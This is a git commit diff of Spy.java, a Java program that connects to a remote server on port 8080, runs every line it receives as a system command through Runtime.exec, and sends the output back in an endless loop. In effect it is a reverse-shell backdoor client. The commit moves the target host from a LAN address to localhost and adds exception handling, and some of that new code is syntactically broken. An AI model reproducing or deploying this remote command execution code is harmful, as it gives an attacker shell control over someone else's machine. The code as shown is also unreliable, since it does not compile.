9a9328e4a7b83865361c0b83c600899c9e6bac4c
tarcisio-marinho <tarcisio_marinho09@hotmail.com>
2018-10-17 21:44:04 -0300

    exception handling and static server

--- Spy.java
+++ Spy.java
@@ -4,6 +4,10 @@ import java.net.*;
 
 public class Spy{
 
+	public void error(){
+		System.exit(-1);
+	}
+
 	public static void main(String args[]) throws UnknownHostException, IOException{
 
 		final int port = 8080;
@@ -20,43 +24,52 @@ public class Spy{
 		
 		
 		try{
-			socketCliente = new Socket("192.168.0.102", port);
-			System.out.println("Conexao estabelecida");
-
-			do{
-				
-				reader = new BufferedReader(new InputStreamReader(socketCliente.getInputStream()));
-				lido = reader.readLine();
-				System.out.println("Servidor SAYS: "  + lido);	
-				
-				runtime = Runtime.getRuntime();
-				process = runtime.exec(lido);
-				process.waitFor();
-				
-
-				writer = new OutputStreamWriter(socketCliente.getOutputStream());
-				PrintWriter out = new PrintWriter(writer);
-				
-				
-
-				soBuffer = new BufferedReader(new InputStreamReader(process.getInputStream()));
-				lido = "";
-				String fina = "";
-				while ((lido = soBuffer.readLine()) != null) {
-					System.out.println(lido);
-					
-					fina = fina + lido;
-				}
-				
-				out.println( fina );
-				out.flush();
-
-			}while( true );
-
-
+			socketCliente = new Socket("127.0.0.1", port);
 		}catch(Exception error){
 			error.getMessage();
+			error();
 		}
+		System.out.println("Conexao estabelecida");
+
+		do{
+			try{
+				reader = new BufferedReader(new InputStreamReader(socketCliente.getInputStream()));
+			}catch(Exception error){
+				error.getMessage();
+			}
+			lido = reader.readLine();
+			System.out.println("Servidor SAYS: "  + lido);	
+			
+			runtime = Runtime.getRuntime();
+			process = runtime.exec(lido);
+			process.waitFor();
+			
+			try{
+				writer = new OutputStreamWriter(socketCliente.getOutputStream());
+			catch(Exception error){
+				error.getMessage();
+				error();
+			}
+			PrintWriter out = new PrintWriter(writer);
+			
+			
+
+			soBuffer = new BufferedReader(new InputStreamReader(process.getInputStream()));
+			lido = "";
+			String fina = "";
+			while ((lido = soBuffer.readLine()) != null) {
+				System.out.println(lido);
+				
+				fina = fina + lido;
+			}
+			
+			out.println( fina );
+			out.flush();
+
+		}while( true );
+
+
+		
 
 	
 	}
